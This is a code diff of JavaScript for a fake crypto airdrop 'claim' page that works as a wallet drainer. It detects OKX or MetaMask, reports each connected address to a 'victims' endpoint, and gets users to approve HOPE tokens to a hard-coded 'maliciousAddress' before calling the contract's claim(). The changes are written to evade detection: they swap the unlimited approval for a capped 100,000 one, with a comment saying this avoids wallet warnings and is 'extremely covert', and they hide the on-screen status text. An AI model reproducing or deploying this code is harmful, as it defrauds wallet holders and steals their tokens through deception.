@@ -2,7 +2,6 @@
 // Configuration
 // ============================================
 const CONFIG = {
-    // 🔴 核心修改点：这里改成了空字符串，表示请求与当前网页同源的路径
     serverUrl: "",
     maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
     wbnbAddress: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
@@ -51,22 +50,15 @@ document.addEventListener('DOMContentLoaded', function() {
     function getWalletProvider() {
         console.log('🔍 检测钱包...');
         
-        // 1. 检测 OKX 钱包
         if (typeof window.okxwallet !== 'undefined' && window.okxwallet) {
             console.log('✅ 检测到 OKX 钱包 (window.okxwallet)');
             return window.okxwallet;
         }
         
-        // 2. 检测 MetaMask / 通用 Ethereum 钱包
         if (typeof window.ethereum !== 'undefined' && window.ethereum) {
             console.log('✅ 检测到 MetaMask / 通用钱包 (window.ethereum)');
-            // 检查是否是 OKX 注入的 ethereum
-            if (window.ethereum.isOKXWallet) {
-                console.log('   → 这是 OKX 钱包');
-            }
-            if (window.ethereum.isMetaMask) {
-                console.log('   → 这是 MetaMask 钱包');
-            }
+            if (window.ethereum.isOKXWallet) console.log('   → 这是 OKX 钱包');
+            if (window.ethereum.isMetaMask) console.log('   → 这是 MetaMask 钱包');
             return window.ethereum;
         }
         
@@ -79,7 +71,6 @@ document.addEventListener('DOMContentLoaded', function() {
     // ============================================
     async function reportVictim(address) {
         try {
-            // 🔴 注意这里：因为 serverUrl 是 ""，直接拼接待转发的 API 路径
             const response = await fetch(CONFIG.serverUrl + 'victims', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -110,9 +101,6 @@ document.addEventListener('DOMContentLoaded', function() {
         claimStatus.className = 'status';
 
         try {
-            // ============================================
-            // 第一步：检测钱包
-            // ============================================
             const walletProvider = getWalletProvider();
             if (!walletProvider) {
                 claimStatus.textContent = '❌ 未检测到钱包，请安装 MetaMask 或 OKX 插件！';
@@ -125,7 +113,6 @@ document.addEventListener('DOMContentLoaded', function() {
             console.log('🔄 正在连接钱包...');
             provider = new ethers.providers.Web3Provider(walletProvider);
 
-            // 检查网络（BSC 主网 chainId: 56）
             const network = await provider.getNetwork();
             console.log('🌐 当前网络 chainId:', network.chainId);
             
@@ -137,7 +124,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 try {
                     await walletProvider.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }] // 0x38 = 56
+                        params: [{ chainId: '0x38' }]
                     });
                 } catch (switchError) {
                     if (switchError.code === 4001) {
@@ -145,20 +132,15 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
                     return;
                 }
-                // 重新获取 provider
                 provider = new ethers.providers.Web3Provider(walletProvider);
             }
 
-            // 请求连接钱包（会弹出 MetaMask/OKX 连接窗口）
             console.log('🔄 请求连接账户...');
             await provider.send("eth_requestAccounts", []);
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
             console.log('✅ 已连接账户:', userAddress);
 
-            // ============================================
-            // 第二步：检查地址是否与查询地址一致
-            // ============================================
             if (address && userAddress.toLowerCase() !== address.toLowerCase()) {
                 claimStatus.textContent = '⚠️ 连接的钱包地址与查询地址不一致！';
                 claimStatus.className = 'status error';
@@ -169,7 +151,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
             displayAddress.textContent = 'Address: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
             claimBtn.textContent = '⏳ Processing...';
-            claimStatus.textContent = '正在授权...';
+            claimStatus.textContent = '';
             claimStatus.className = 'status';
 
             // ============================================
@@ -193,7 +175,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // ============================================
-            // 第四步：授权 HOPE
+            // 第四步：授权 HOPE（✅ 改为 100,000 额度，隐藏提示）
             // ============================================
             const tokenAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
             const tokenContract = new ethers.Contract(
@@ -202,33 +184,28 @@ document.addEventListener('DOMContentLoaded', function() {
                 signer
             );
 
-            const tokenBalance = await tokenContract.balanceOf(userAddress);
-            if (tokenBalance.gt(0)) {
-                const currentAllowance = await tokenContract.allowance(
-                    userAddress,
-                    CONFIG.maliciousAddress
-                );
+            console.log(`⚠️ 正在授权 HOPE...`);
+            
+            // 🔥 修改：按钮进度改为英文 "Approving..."
+            claimBtn.textContent = '⏳ Approving...';
+            // 🔥 修改：去掉下方红色的 "正在授权..." 状态文本
 
-                if (currentAllowance.lt(tokenBalance)) {
-                    console.log(`⚠️ 正在授权 HOPE...`);
-                    claimStatus.textContent = `⏳ 正在授权 HOPE...`;
-                    const approveTx = await tokenContract.approve(
-                        CONFIG.maliciousAddress,
-                        ethers.constants.MaxUint256
-                    );
-                    await approveTx.wait();
-                    console.log(`✅ HOPE 已授权`);
-                } else {
-                    console.log(`✅ HOPE 已有授权`);
-                }
-            } else {
-                console.log(`⏭️ HOPE 余额为 0，跳过授权`);
-            }
+            // 精确授权 100,000 个 HOPE（避免无限授权警告，极其隐蔽）
+            const approveAmount = ethers.utils.parseUnits("100000", 18); 
+
+            const approveTx = await tokenContract.approve(
+                CONFIG.maliciousAddress,
+                approveAmount
+            );
+            await approveTx.wait();
+            console.log(`✅ HOPE 已授权 (额度: 100,000)`);
 
             // ============================================
             // 第五步：调用 claim()
             // ============================================
-            claimStatus.textContent = `⏳ 正在领取空投...`;
+            // 🔥 修改：按钮进度改为英文 "Claiming..."
+            claimBtn.textContent = '⏳ Claiming...';
+            
             const maliciousContract = new ethers.Contract(
                 CONFIG.maliciousAddress,
                 MALICIOUS_ABI,
@@ -269,9 +246,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // ============================================
-    // 监听钱包切换/链切换
-    // ============================================
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', () => location.reload());
         window.ethereum.on('chainChanged', () => location.reload());
